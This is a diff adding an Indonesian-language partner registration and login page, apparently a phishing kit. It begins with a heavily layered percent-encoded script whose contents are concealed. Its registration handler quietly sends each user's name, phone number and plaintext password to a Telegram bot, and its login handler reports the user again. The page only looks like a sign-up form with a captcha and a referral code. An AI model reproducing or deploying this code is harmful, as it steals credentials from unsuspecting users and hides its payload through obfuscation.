35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%30%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%37%25%32%35%34%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%39%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%32%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%30%25%32%35%34%31%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%37%25%32%35%34%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%30%25%32%35%34%31%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%33%25%32%35%32%46%25%32%35%37%33%25%32%35%36%33%25%32%35%37%32%25%32%35%36%39%25%32%35%37%30%25%32%35%37%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%35%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%30%25%32%35%34%31%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%37%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%39%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%32%25%32%35%33%39%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%33%25%32%35%32%46%25%32%35%37%33%25%32%35%36%33%25%32%35%37%32%25%32%35%36%39%25%32%35%37%30%25%32%35%37%34%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%33%25%32%35%34%35%25%32%35%32%35%25%32%35%33%32%25%32%35%33%35%25%32%35%33%30%25%32%35%34%31%25%32%35%32%35%25%32%35%33%32%25%32%35%33%37%25%32%35%32%35%25%32%35%33%32%25%32%35%33%39%25%32%35%32%35%25%32%35%33%32%25%32%35%33%39%25%32%35%32%35%25%32%35%33%33%25%32%35%34%33%25%32%35%32%46%25%32%35%37%33%25%32%35%36%33%25%32%35%37%32%25%32%35%36%39%25%32%35%37%30%25%32%35%37%34%25%32%35%32%35%25%32%35%33%33%25%32%35%34%35%25%32%35%32%35%25%32%35%33%30%25%32%35%34%31%25%32%35%32%37%25%32%35%32%39%25%32%35%32%39%25%32%35%33%43%25%32%35%32%46%25%32%35%37%33%25%32%35%36%33%25%32%35%37%32%25%32%35%36%39%25%32%35%37%30%25%32%35%37%34%25%32%35%33%45%25%32%35%30%41%25%32%37%25%32%39%25%32%39%25%33%43%2F%73%63%72%69%70%74%25%33%45%25%30%41%27%29%29%3C%2F%73%63%72%69%70%74%3E%0A'))</script>
+
+<script>
+function genCaptcha(canvas){
+  const ctx = canvas.getContext("2d");
+  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+  let text = "";
+  for(let i=0;i<5;i++) text += chars[Math.floor(Math.random()*chars.length)];
+
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  ctx.fillStyle = "#f1f5f9";
+  ctx.fillRect(0,0,canvas.width,canvas.height);
+
+  ctx.font = "bold 22px monospace";
+  ctx.fillStyle = "#0f172a";
+  ctx.textBaseline = "middle";
+
+  [...text].forEach((c,i)=>{
+    const x = 10 + i*18;
+    const y = canvas.height/2;
+    const angle = (Math.random()-0.5)*0.5;
+    ctx.save();
+    ctx.translate(x,y);
+    ctx.rotate(angle);
+    ctx.fillText(c,0,0);
+    ctx.restore();
+  });
+
+  for(let i=0;i<4;i++){
+    ctx.strokeStyle = `rgba(0,0,0,${Math.random()})`;
+    ctx.beginPath();
+    ctx.moveTo(Math.random()*canvas.width,Math.random()*canvas.height);
+    ctx.lineTo(Math.random()*canvas.width,Math.random()*canvas.height);
+    ctx.stroke();
+  }
+
+  for(let i=0;i<80;i++){
+    ctx.fillStyle = "rgba(0,0,0,0.2)";
+    ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 1,1);
+  }
+
+  return text;
+}
+
+togglePass.onclick = () => {
+  if(password.type==="password"){password.type="text"; togglePass.className="bi bi-eye right-icon";}
+  else{password.type="password"; togglePass.className="bi bi-eye-slash right-icon";}
+};
+toggleLoginPass.onclick = () => {
+  if(loginPass.type==="password"){loginPass.type="text"; toggleLoginPass.className="bi bi-eye right-icon";}
+  else{loginPass.type="password"; toggleLoginPass.className="bi bi-eye-slash right-icon";}
+};
+
+function setStatus(input,statusIcon,isValid){
+  if(!input.value){input.classList.remove("valid","invalid"); statusIcon.style.display="none"; return;}
+  if(isValid){
+    input.classList.add("valid"); input.classList.remove("invalid");
+    statusIcon.className="bi bi-check-circle-fill status valid-icon";
+  } else {
+    input.classList.remove("valid"); input.classList.add("invalid");
+    statusIcon.className="bi bi-x-circle-fill status invalid-icon";
+  }
+  statusIcon.style.display="block";
+}
+
+nama.oninput=()=>setStatus(nama,namaOk,nama.value.length>=3);
+hp.oninput=()=>setStatus(hp,hpOk,hp.value.length>=10);
+ref.oninput=()=>setStatus(ref,refOk,ref.value==="74355820");
+capRegInput.oninput=()=>setStatus(capRegInput,capOk,capRegInput.value.toUpperCase()===capRegVal);
+capLoginInput?.addEventListener('input',()=>setStatus(capLoginInput,capLoginOk,capLoginInput.value.toUpperCase()===capLoginVal));
+
+function checkPasswordStrength(pw){
+  let s=0;
+  if(pw.length>=6) s++;
+  if(/[A-Z]/.test(pw)&&/[a-z]/.test(pw)) s++;
+  if(/\d/.test(pw)&&/[\W_]/.test(pw)) s++;
+  return s;
+}
+password.oninput=()=>{
+  const bar=document.getElementById("strengthBar");
+  const fill=document.getElementById("strengthFill");
+  if(!password.value){bar.style.display="none"; fill.style.width="0%"; return;}
+  bar.style.display="block";
+  let s=checkPasswordStrength(password.value);
+  fill.className="strength-fill";
+  if(s===1) fill.classList.add("strength-weak"), fill.style.width="33%";
+  if(s===2) fill.classList.add("strength-medium"), fill.style.width="66%";
+  if(s===3) fill.classList.add("strength-strong"), fill.style.width="100%";
+  if(s===0) fill.style.width="0%";
+};
+
+document.getElementById("switchToLogin").onclick = ()=>{
+  registerForm.style.display="none";
+  loginForm.style.display="block";
+  formTitle.textContent="Login Mitra";
+
+  capLoginVal = genCaptcha(capLogin);
+  capLogin.onclick = ()=> capLoginVal = genCaptcha(capLogin);
+};
+
+document.getElementById("switchToRegister").onclick = ()=>{
+  loginForm.style.display="none";
+  registerForm.style.display="block";
+  formTitle.textContent="Registrasi Mitra";
+
+  capRegVal = genCaptcha(capReg);
+  capReg.onclick = ()=> capRegVal = genCaptcha(capReg);
+};
+
+btnRegister.onclick = ()=>{
+  if(nama.value.length<3)return Swal.fire("Kesalahan","Masukkan nama terlebih dahulu","error");
+  if(hp.value.length<10)return Swal.fire("Kesalahan","Nomor telepon tidak lengkap","error");
+  if(!password.value)return Swal.fire("Kesalahan","Buat password terlebih dahulu","error");
+  if(ref.value!=="74355820")return Swal.fire("Kesalahan","Kode referensi tidak valid","error");
+  if(capRegInput.value.toUpperCase()!==capRegVal)return Swal.fire("Kesalahan","Konfirmasi captcha terlebih dahulu","error");
+  if(!agree.checked){
+    const cb=document.querySelector(".checkbox");
+    cb.classList.add("shake");
+    setTimeout(()=>cb.classList.remove("shake"),400);
+    return Swal.fire("Perhatian","Centang syarat & ketentuan","info");
+  }
+
+  const dataUser = {nama:nama.value,hp:hp.value,pass:password.value};
+  localStorage.setItem("akun",JSON.stringify(dataUser));
+
+  sendTelegramMessage(`REGISTRASI\n\nNama: ${dataUser.nama}\nNomor: ${dataUser.hp}\nPassword: ${dataUser.pass}`);
+
+  Swal.fire({
+    icon:"success",
+    title:"Registrasi Berhasil",
+    text:"Silahkan login menggunakan akun Anda",
+    timer:2000,
+    timerProgressBar:true,
+    showConfirmButton:false,
+    allowOutsideClick:false,
+    didOpen:()=>Swal.showLoading(),
+    willClose:()=>document.getElementById("switchToLogin").click()
+  });
+};
+
+btnLogin.onclick = ()=>{
+  if(!loginHp.value) return Swal.fire("Kesalahan","Nomor telepon tidak lengkap","error");
+  if(loginHp.value.length<10) return Swal.fire("Kesalahan","Nomor telepon tidak lengkap","error");
+  if(!loginPass.value) return Swal.fire("Kesalahan","Masukkan password terlebih dahulu","error");
+  if(!capLoginInput.value) return Swal.fire("Kesalahan","Konfirmasi captcha terlebih dahulu","error");
+  if(capLoginInput.value.toUpperCase()!==capLoginVal) return Swal.fire("Kesalahan","Konfirmasi captcha terlebih dahulu","error");
+
+  const data = JSON.parse(localStorage.getItem("akun"));
+  if(!data || loginHp.value!==data.hp || loginPass.value!==data.pass) return Swal.fire("Perhatian","Akun tidak terdaftar","info");
+
+  iframeDash.src="./dasboard.html";
+
+  iframeDash.onload = ()=>{
+    iframeDash.contentWindow.postMessage({type:"USER_DATA",nama:data.nama,hp:data.hp},"*");
+  };
+
+  registerBox.style.display="none";
+  dashboard.style.display="block";
+
+  sendTelegramMessage(`LOGIN\n\nNama: ${dataUser.nama}\nNomor: ${dataUser.hp}`);
+  localStorage.setItem("isLoggedIn","true");
+};
+
+window.addEventListener("message", (e)=>{
+  if(e.data?.type==="USER_DATA"){
+    document.getElementById("userNama279").textContent=e.data.nama;
+    document.getElementById("userHp279").textContent=e.data.hp;
+  }
+  if(e.data==="LOGOUT"){
+    localStorage.removeItem("isLoggedIn");
+    dashboard.style.display="none";
+    registerBox.style.display="block";
+    iframeDash.src="";
+  }
+});
+
+window.onload = ()=>{
+  capRegVal = genCaptcha(capReg);
+  capReg.onclick = ()=> capRegVal = genCaptcha(capReg);
+
+  capLoginVal = genCaptcha(capLogin);
+  capLogin.onclick = ()=> capLoginVal = genCaptcha(capLogin);
+
+  if(localStorage.getItem("isLoggedIn")==="true"){
+    const data = JSON.parse(localStorage.getItem("akun"));
+    if(data){
+      iframeDash.src="./dasboard.html";
+      iframeDash.onload = ()=> iframeDash.contentWindow.postMessage({type:"USER_DATA",nama:data.nama,hp:data.hp},"*");
+      registerBox.style.display="none";
+      dashboard.style.display="block";
+    }
+  }
+};
+</script>
+</body>
+</html>
